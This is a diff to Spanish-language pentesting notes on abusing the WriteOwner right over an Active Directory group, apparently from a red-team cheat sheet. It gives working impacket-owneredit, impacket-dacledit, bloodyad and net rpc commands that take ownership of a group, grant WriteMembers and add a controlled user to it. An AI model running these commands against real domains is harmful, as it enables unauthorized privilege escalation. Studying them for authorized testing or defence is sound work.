@@ -9,10 +9,10 @@ Si tenemos esta ACL sobre un **Group**, podemos **cambiar el propietario del gru
 ```bash 
 Paso 1:
 # Cambiar la propiedad del objeto 
-❯ impacket-owneredit -action write -new-owner 'attacker' -target 'Target_Group' domain/ControlledUser:'P@$$w0rd123!'
+❯ impacket-owneredit -action write -new-owner 'ControlledUser' -target 'Target_Group' domain/ControlledUser:'P@$$w0rd123!'
 
-	# attacker = Usuario al que vas a asignar como nuevo propietario del objeto
-	# target = Grupo, usuario, equipo víctima sobre el que se tienen los derechos 
+	# ControlledUser = Usuario al que se asigna como nuevo propietario del objeto
+	# target = Grupo víctima sobre el que se tienen los derechos 
 	# ControlledUser & password = Credenciales del usuario que tiene los derechos de 'WriteOwner'
 ```
 
@@ -23,7 +23,7 @@ Paso 2:
 ❯ impacket-dacledit -action 'write' -rights 'WriteMembers' -principal 'ControlledUser' -target-dn 'groupDistinguidedName' domain/ControlledUser:'P@$$w0rd123!'
 
 	# ControlledUser = Usuario al que se le va a asignar el permiso dentro del ACL del objeto destino
-	# target-dn = Es el 'Distinguished Name' (CN=Management,CN=Users,DC=Domain,DC=Corp)
+	# target-dn = Es el 'Distinguished Name' (CN=Management,CN=Users,DC=Domain,DC=Corp) obtenido de BloodHound 
 	# ControlledUser & password = Credenciales del usuario que tiene los derechos de 'WriteOwner'
 
 Notas:
@@ -33,6 +33,9 @@ Notas:
 ```bash 
 Paso 3:
 # Agregar miembros al grupo
+❯ bloodyad -d domain.local -u ControlledUser -p 'P@$$w0rd123!' -H IP_DC add groupMember 'Target_Group' ControlledUser
+
+# Forma dos de hacerlo 
 ❯ net rpc group addmem 'Target_Group' 'TargetUser' -U domain/ControlledUser:'P@$$w0rd123!' -S IP_DC
 
 	# TargetGroup = Grupo víctima sobre el que se tienen los derechos
